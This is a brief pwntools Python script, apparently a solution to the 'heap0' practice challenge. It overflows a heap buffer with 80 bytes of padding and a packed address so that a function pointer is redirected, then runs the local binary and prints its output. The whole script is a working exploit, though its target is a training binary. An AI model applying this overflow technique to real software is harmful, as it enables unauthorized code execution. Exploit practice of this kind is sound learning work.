from pwn import *

elf = context.binary = ELF('./heap0', checksec=False)

payload = b'A' * 80 + p32(0x401196)
print(f"param 1 :{payload}\n")
p = elf.process(argv=[payload])
print(p.clean().decode('latin-1'))
